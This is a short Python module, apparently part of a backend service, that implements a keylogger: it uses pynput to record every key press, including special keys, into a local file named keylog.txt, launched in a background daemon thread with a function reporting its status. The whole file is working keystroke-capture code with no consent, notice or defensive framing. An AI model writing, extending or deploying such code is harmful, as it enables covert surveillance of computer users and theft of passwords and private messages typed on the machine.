# backend/services/keylogger.py

from pynput import keyboard
import threading

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    threading.Thread(target=listener.start, daemon=True).start()
    return {"status": "Keylogger started", "log": log_file}

